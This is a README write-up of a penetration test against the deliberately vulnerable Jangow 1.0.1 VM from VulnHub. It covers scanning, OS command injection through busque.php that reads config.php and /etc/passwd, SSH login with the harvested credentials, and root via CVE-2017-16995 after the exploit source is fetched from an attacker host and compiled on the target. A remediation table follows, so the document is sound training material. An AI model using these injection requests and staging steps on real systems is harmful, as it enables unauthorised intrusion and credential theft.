<div align="center">

```
     ██╗ █████╗ ███╗   ██╗ ██████╗  ██████╗ ██╗    ██╗
     ██║██╔══██╗████╗  ██║██╔════╝ ██╔═══██╗██║    ██║
     ██║███████║██╔██╗ ██║██║  ███╗██║   ██║██║ █╗ ██║
██   ██║██╔══██║██║╚██╗██║██║   ██║██║   ██║██║███╗██║
╚█████╔╝██║  ██║██║ ╚████║╚██████╔╝╚██████╔╝╚███╔███╔╝
 ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝  ╚══╝╚══╝
```

# Black-Box Penetration Test 
### Target: Jangow 1.0.1 (VulnHub) &nbsp;|&nbsp; Scope: External Network → Web App → OS → Root

<p>


</p>

<p>


</p>

<p>
<a href="https://www.vulnhub.com/entry/jangow-101,754/"></a>
<a href="./report/Jangow_1.0.1_Pentest_Report.pdf"></a>
<a href="#"></a>
</p>

</div>

<br>

## 📋 Executive Summary

This repository documents a full black-box penetration test conducted against **Jangow 1.0.1**, a deliberately vulnerable Linux host distributed via VulnHub for offensive security training. The engagement followed a structured methodology — external reconnaissance, web application enumeration, exploitation, credential harvesting, and local privilege escalation — culminating in full root compromise of the target.

The objective of this write-up is to demonstrate a repeatable, professional pentesting workflow rather than a "flag-hunting" CTF narrative: every step is mapped to a real-world attack technique, supported by evidence, and closed out with remediation guidance a client report would include.

<div align="center">

| 🎯 Target | 🌐 Attack Surface | 🚪 Foothold Vector | 🔁 Lateral Move | ⬆️ Privesc Vector |
|:---:|:---:|:---:|:---:|:---:|
| Jangow 1.0.1 (`.ova`) | FTP (21) · HTTP (80) | Unauth. OS Command Injection | Credential Reuse (Config → SSH) | CVE-2017-16995 (Kernel 4.4.0) |

</div>

> [!NOTE]
> Full chained outcome: **root shell** obtained, with `user.txt` and `root.txt` both captured as proof of compromise.

---

## 🗂️ Table of Contents

<table>
<tr>
<td valign="top">

**Setup & Strategy**
- [Lab Setup](#-lab-setup)
- [Attack Chain Overview](#-attack-chain-overview)

**Kill Chain**
- [Phase 1 — Reconnaissance](#-phase-1--reconnaissance)
- [Phase 2 — Web Enumeration](#-phase-2--web-application-enumeration)
- [Phase 3 — Command Injection](#-phase-3--exploitation-os-command-injection)

</td>
<td valign="top">

**Kill Chain (cont.)**
- [Phase 4 — Credential Harvesting](#-phase-4--credential-harvesting)
- [Phase 5 — Initial Access](#-phase-5--initial-access)
- [Phase 6 — Privilege Escalation](#-phase-6--privilege-escalation)

**Wrap-up**
- [Automation Scripts](#-automation-scripts)
- [Vulnerability Summary & Remediation](#-vulnerability-summary--remediation)

</td>
<td valign="top">

**Reference**
- [Tools Used](#-tools-used)
- [Repository Structure](#-repository-structure)
- [Skills Demonstrated](#-skills-demonstrated)
- [Legal & Ethical Disclaimer](#-legal--ethical-disclaimer)

</td>
</tr>
</table>

---

## 🧪 Lab Setup

<div align="center">

| Component | Detail |
|:--|:--|
| 🖥️ Hypervisor | VirtualBox |
| 🌐 Network Mode | Host-Only / NAT (isolated lab segment) |
| ⚔️ Attacker Host | Kali Linux |
| 🎯 Target | Jangow 1.0.1 (DHCP-assigned IP) |
| 📍 Target IP (example) | `192.168.56.X` |

</div>

> [!TIP]
> Replace example IPs/hostnames throughout this document with your own lab values before publishing screenshots.

[`↑ back to top`](#-table-of-contents)

---

## 🔗 Attack Chain Overview

```mermaid
flowchart LR
    A[🔍 Reconnaissance<br/>Nmap: ports 21, 80] --> B[🌐 Web Enumeration<br/>Dirb / Manual Browsing]
    B --> C[💉 Command Injection<br/>busque.php?buscar=]
    C --> D[🔑 Credential Harvest<br/>wordpress/config.php]
    D --> E[🚪 Initial Access<br/>FTP/SSH as jangow01]
    E --> F[⬆️ Kernel Privesc<br/>uname -a → 4.4.0]
    F --> G[👑 Root Shell<br/>CVE-2017-16995]

    style A fill:#1f6feb,stroke:#fff,color:#fff
    style B fill:#1f6feb,stroke:#fff,color:#fff
    style C fill:#da3633,stroke:#fff,color:#fff
    style D fill:#bf8700,stroke:#fff,color:#fff
    style E fill:#bf8700,stroke:#fff,color:#fff
    style F fill:#8957e5,stroke:#fff,color:#fff
    style G fill:#2ea043,stroke:#fff,color:#fff
```



[`↑ back to top`](#-table-of-contents)

---

## 🔍 Phase 1 — Reconnaissance

Standard external recon to fingerprint live services before touching the application layer.

```bash
nmap -sC -sV -p- -T4 -oN nmap_initial.txt <TARGET_IP>
```

<div align="center">

| Port | Service | Version |
|:---:|:---:|:---|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 80/tcp | HTTP | Apache 2.4.18 (Ubuntu) |

</div>

<details>
<summary>📜 Raw scan output</summary>

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
|_http-title: Index of /
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

</details>

Anonymous FTP login was attempted and **failed** — credentials would need to be sourced elsewhere in the kill chain.

[`↑ back to top`](#-table-of-contents)

---

## 🌐 Phase 2 — Web Application Enumeration

Directory brute-forcing with default wordlists (`dirb`, `gobuster`) returned limited results, so enumeration shifted to manual browsing of the exposed `Index of /` listing.

```bash
gobuster dir -u http://<TARGET_IP>/site/ -w /usr/share/wordlists/dirb/common.txt
```

This surfaced a `site/` directory containing a `wordpress/` folder and a script named `busque.php` — a search feature accepting a `buscar` (Spanish for "search") GET parameter.

[`↑ back to top`](#-table-of-contents)

---

## 💉 Phase 3 — Exploitation: OS Command Injection

> [!IMPORTANT]
> **Finding:** Unauthenticated OS Command Injection — `CWE-78` / OWASP A03:2021 (Injection) — **Severity: Critical**

Probing the `buscar` parameter with shell metacharacters returned unfiltered command output:

```http
GET /site/busque.php?buscar=ls+-la HTTP/1.1
Host: <TARGET_IP>
```

Source confirmed via injected `cat`:

```php
<?php system($_GET['buscar']); ?>
```

User-controlled input passed directly into `system()` with zero sanitization — full arbitrary command execution as the web service user. A reverse shell was attempted but the target had **no outbound internet access**, so the engagement pivoted to a **blind enumeration strategy** entirely through injected commands.

A lightweight Python wrapper (see [Automation Scripts](#-automation-scripts)) was used to script repeated injections without manually re-encoding URLs in Burp Repeater each time.

[`↑ back to top`](#-table-of-contents)

---

## 🔑 Phase 4 — Credential Harvesting

Continued enumeration through the injection point revealed a WordPress configuration file:

```http
GET /site/busque.php?buscar=cat+wordpress/config.php HTTP/1.1
```

```php
$username = "desafio02";
$password = "abygurl69";
```

Cross-referencing `/etc/passwd` (also pulled via injection) revealed a local system account that didn't match the DB username directly:

```http
GET /site/busque.php?buscar=cat+/etc/passwd HTTP/1.1
```

```
jangow01:x:1000:1000:desafio02,,,:/home/jangow01:/bin/bash
```

The GECOS field (`desafio02`) tied the database credentials back to the **`jangow01`** system account — a classic case of **password/secret reuse across application and OS layers**.

<div align="center">

### 🔓 Harvested Credentials: `jangow01 : abygurl69`

</div>

[`↑ back to top`](#-table-of-contents)

---

## 🚪 Phase 5 — Initial Access

```bash
ftp <TARGET_IP>
# Name: jangow01
# Password: abygurl69
```

FTP access confirmed the credentials but offered limited interactivity. SSH was tested next using the same pair and succeeded, providing a full interactive shell:

```bash
ssh jangow01@<TARGET_IP>
cat /home/jangow01/user.txt
```

<div align="center">

**✅ USER FLAG CAPTURED**

</div>

[`↑ back to top`](#-table-of-contents)

---

## ⬆️ Phase 6 — Privilege Escalation

Kernel fingerprinting identified an outdated, exploitable build:

```bash
uname -a
# Linux jangow01 4.4.0-* Ubuntu 16.04 x86_64
```

> [!IMPORTANT]
> Kernel **4.4.0** is vulnerable to **CVE-2017-16995** (eBPF `BPF_ALU64` sign-extension bug) — a well-documented local privilege escalation flaw with public PoC exploit code.

Since the target had no outbound internet access, the exploit source was staged via FTP rather than `wget`/`curl`:

```bash
# On attacker host: serve exploit via FTP or simple HTTP server
# On target:
ftp <ATTACKER_IP>
get cve-2017-16995.c
exit

gcc cve-2017-16995.c -o cve-2017-16995
chmod +x cve-2017-16995
./cve-2017-16995
```

```bash
whoami
# root
cat /root/proof.txt
```

<div align="center">

**👑 ROOT FLAG CAPTURED — FULL SYSTEM COMPROMISE ACHIEVED**

</div>

[`↑ back to top`](#-table-of-contents)

---

## 🤖 Automation Scripts

This repo includes scripts that operationalize the manual steps above into a repeatable toolchain:

<div align="center">

| Script | Purpose |
|:--|:--|
| `recon.sh` | Automated Nmap sweep + service version capture |
| `cmdi_shell.py` | Pseudo-shell wrapper around the `busque.php` command injection for rapid blind enumeration |
| `cred_harvest.py` | Pulls and parses `config.php` / `/etc/passwd` via the injection point to auto-extract credential pairs |
| `privesc_stager.sh` | Stages the CVE-2017-16995 exploit to the target over FTP and compiles it remotely |

</div>

> See [`/scripts`](./scripts) for full source and usage instructions.

[`↑ back to top`](#-table-of-contents)

---

## 🛡️ Vulnerability Summary & Remediation

<div align="center">

| # | Finding | Severity | Reference | Remediation |
|:-:|:--|:-:|:-:|:--|
| 1 | Unauthenticated OS Command Injection in `busque.php` |  | CWE-78 | Eliminate `system()`/`exec()` on user input; use parameterized APIs or allow-listed commands |
| 2 | Plaintext credentials stored in `wordpress/config.php` |  | CWE-256 | Externalize secrets to env vars/vault; restrict file permissions |
| 3 | Credential reuse between DB account and OS-level account |  | CWE-521 | Enforce unique credentials per trust boundary; enable MFA on SSH/FTP |
| 4 | Outdated, unpatched Linux kernel (4.4.0) |  | CVE-2017-16995 | Establish kernel patch cadence; apply seccomp/AppArmor profiles |
| 5 | FTP service permitting auth without TLS |  | CWE-319 | Disable FTP in favor of SFTP/FTPS |

</div>

[`↑ back to top`](#-table-of-contents)

---

## 🧰 Tools Used

<p>


</p>

[`↑ back to top`](#-table-of-contents)

---

## 📁 Repository Structure

```
.
├── README.md
├── recon/
│   └── nmap_initial.txt
├── scripts/
│   ├── recon.sh
│   ├── cmdi_shell.py
│   ├── cred_harvest.py
│   └── privesc_stager.sh
├── exploits/
│   └── cve-2017-16995.c
├── evidence/
│   ├── 01_nmap_scan.png
│   ├── 02_command_injection_poc.png
│   ├── 03_config_php_leak.png
│   ├── 04_user_flag.png
│   └── 05_root_flag.png
└── report/
    └── Jangow_1.0.1_Pentest_Report.pdf
```

[`↑ back to top`](#-table-of-contents)

---

## 🧠 Skills Demonstrated

<div align="center">

| Category | Demonstrated Capability |
|:--|:--|
| 🔭 **Recon & Enumeration** | External service fingerprinting; manual web enumeration beyond default wordlists |
| 💉 **Exploitation** | Unauthenticated OS command injection identification & exploitation |
| 🕶️ **Constrained Operating** | Blind/output-based exploitation under restricted outbound connectivity |
| 🔑 **Credential Analysis** | Cross-boundary credential correlation (application layer → OS layer) |
| ⬆️ **Privilege Escalation** | Linux kernel vulnerability research and local exploit compilation |
| 🛠️ **Exploit Engineering** | On-target compilation workflow; FTP staging in lieu of direct downloads |
| 📝 **Reporting** | Client-ready vulnerability documentation with CWE mapping and remediation guidance |

</div>

[`↑ back to top`](#-table-of-contents)

---

## ⚖️ Legal & Ethical Disclaimer

> [!WARNING]
> This assessment was performed exclusively against **Jangow 1.0.1**, an intentionally vulnerable virtual machine distributed by VulnHub for security training purposes, in an isolated, offline lab environment. No real-world systems, third-party infrastructure, or production data were accessed at any point.
>
> This repository is published strictly for **educational and professional portfolio purposes**. The techniques documented here must **never** be used against systems without explicit, written authorization. Unauthorized access to computer systems is illegal under laws such as the Computer Fraud and Abuse Act (US) and equivalent legislation in other jurisdictions.

---

<div align="center">

### 👤 Author

**Kitsana Thuekoh**
*Cybersecurity Student · Boston Institute of Analytics — Penetration Testing & Security Operations*

<p>


</p>

<p>
<a href="#"></a>
<a href="#"></a>
</p>

⭐ *If this write-up was useful for your own VulnHub practice, consider starring the repo.*

</div>
